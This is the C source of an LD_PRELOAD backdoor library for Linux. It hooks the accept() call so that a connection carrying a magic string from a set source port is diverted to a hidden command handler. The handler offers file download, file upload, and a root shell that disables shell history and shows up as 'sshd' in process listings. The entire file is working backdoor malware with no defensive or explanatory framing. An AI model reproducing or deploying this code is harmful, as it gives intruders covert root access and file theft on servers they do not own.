/* 
 * [linux]# gcc -Wall -Werror -s -shared -fPIC -fno-stack-protector -o preload.so preload.c -ldl
 */

/* ARGV0 is how the shell will look like in the output of ps */
#define ARGV0 "sshd"
/* PRELOAD is the magic string that has to be sent in order to start a
 * shell.. the client might send anything as a terminator, NUL, NL, or
 * whatever else */
#define PRELOAD "4ed1479a7a48653b13d492f52ecbe5d6"
/* if SPORT is not 0, the backdoor will only start a shell if the
 * source port of the connexion is SPORT.. useful for servers that send
 * something to the client before anything else (like ftpd, sshd, etc)
 * but problematic behind a nat.. in this case SPORT 0 and an httpd
 * might be used, for example.. */
#define SPORT 12345 

#include <errno.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <sys/wait.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <limits.h>


#ifndef HAVEUINT32
#define HAVEUINT32
typedef unsigned int uint32;
#endif

#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0x2000
#endif

static void
download (int s)
{
  int i;
  char file[PATH_MAX];
  int fd;
  ssize_t ssize;
  char buffer[BUFSIZ];

  i = recv (s, file, sizeof (file), MSG_NOSIGNAL);
  if (i <= 0)
    {
      exit (EXIT_FAILURE);
    }
  file[i - 1] = '\0';

  fd = open (file, O_RDONLY);
  if (fd < 0)
    {
      exit (EXIT_FAILURE);
    }

  while ((ssize = read (fd, buffer, sizeof (buffer))) > 0)
    {
      i = send (s, buffer, ssize, MSG_NOSIGNAL);
      if (i != ssize)
  {
    exit (EXIT_FAILURE);
  }
    }

  close (fd);
  exit (EXIT_SUCCESS);
}

#define WHO "/usr/bin/who"

static void
who (int s)
{
  char *argv[] = { "/usr/sbin/sshd", NULL }; /* XXX */
  char *envp[] = { NULL };

  dup2 (s, STDIN_FILENO);
  dup2 (s, STDOUT_FILENO);
  dup2 (s, STDERR_FILENO);
  execve (WHO, argv, envp);

  exit (EXIT_FAILURE);
}

static void
upload (int s)
{
  int i;
  char file[PATH_MAX];
  int fd;
  ssize_t ssize;
  char buffer[BUFSIZ];

  i = recv (s, file, sizeof (file), MSG_NOSIGNAL);
  if (i <= 0)
    {
      exit (EXIT_FAILURE);
    }
  file[i - 1] = '\0';

  fd = open (file, O_WRONLY | O_CREAT | O_EXCL, S_IRWXU);
  if (fd < 0)
    {
      exit (EXIT_FAILURE);
    }

  while ((i = recv (s, buffer, sizeof (buffer), MSG_NOSIGNAL)) > 0)
    {
      ssize = write (fd, buffer, i);
      if (ssize != i)
  {
    exit (EXIT_FAILURE);
  }
    }

  close (fd);
  exit (EXIT_SUCCESS);
}

#define SH "/bin/sh"

static void 
shell (int s)
{
  int i;
  char *argv[] = { ARGV0, NULL };
  char *envp[] = { "HISTFILE=/dev/null", NULL };

  pid_t pid;

  pid = fork ();
  if (!pid)
    {
      //if (fork () == 0)
  //{
    //setsid ();

    dup2 (s, 0);
    dup2 (s, 1);
    dup2 (s, 2);
    for (i = 3; i < 1024; i++)
      {
        close (i);
      }

    seteuid (0);
    setuid (0);
    setegid (0);
    setgid (0);

    execve (SH, argv, envp);
  //}
    }
  else
    {
      waitpid (pid, 0, 0);
    }
  exit (EXIT_SUCCESS);
}

typedef struct command_s
{
  char command;
  void (*p_command) (int s);
} command_t;

command_t commands[] = {
  {'d', download},
  {'s', shell},
  {'u', upload},
  {'w', who}
};

static void
blaat (int s)
{
  int i;
  char command[sizeof ("x")];

  i = recv (s, command, sizeof (command), MSG_NOSIGNAL);
  if (i != sizeof (command))
    {
      exit (EXIT_FAILURE);
    }

  for (i = 0; i < sizeof (commands) / sizeof (command_t); i++)
    {
      if (*command == commands[i].command)
  {
    commands[i].p_command (s);
    exit (EXIT_FAILURE);
  }
    }
  exit (EXIT_FAILURE);
}

#ifndef RTLD_NEXT
#define RTLD_NEXT ( (void *)(-1) )
#endif

#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0x2000
#endif

int
accept (int s, struct sockaddr *addr, socklen_t * addrlen)
{
  static int (*p_accept) () = NULL;
  int accepted_s;
  int i;
  socklen_t socklen;
  struct sockaddr sa;
  char buffer[sizeof (PRELOAD)];

  if (p_accept == NULL)
    {
      p_accept = (int (*)()) dlsym (RTLD_NEXT, "accept");
      if (dlerror () != NULL)
	{
	  return (-1);
	}
    }

  accepted_s = p_accept (s, addr, addrlen);
  if (accepted_s < 0)
    {
      return (-1);
    }

  socklen = sizeof (sa);
  i = getpeername (accepted_s, &sa, &socklen);
  if (i)
    {
      return (accepted_s);
    }

  if (sa.sa_family != AF_INET && sa.sa_family != AF_INET6)
    {
      return (accepted_s);
    }

  if (SPORT)
    {
      if (ntohs (((struct sockaddr_in *) &sa)->sin_port) != SPORT)
	{
	  return (accepted_s);
	}
    }

  i = recv (accepted_s, buffer, sizeof (buffer), MSG_PEEK | MSG_NOSIGNAL);
  if (i != sizeof (buffer))
    {
      return (accepted_s);
    }
  if (strncmp (buffer, PRELOAD, sizeof (PRELOAD) - 1))
    {
      return (accepted_s);
    }

  i = recv (accepted_s, buffer, sizeof (buffer), MSG_NOSIGNAL);
  blaat (accepted_s);
  close (accepted_s);

  return (-1);
}
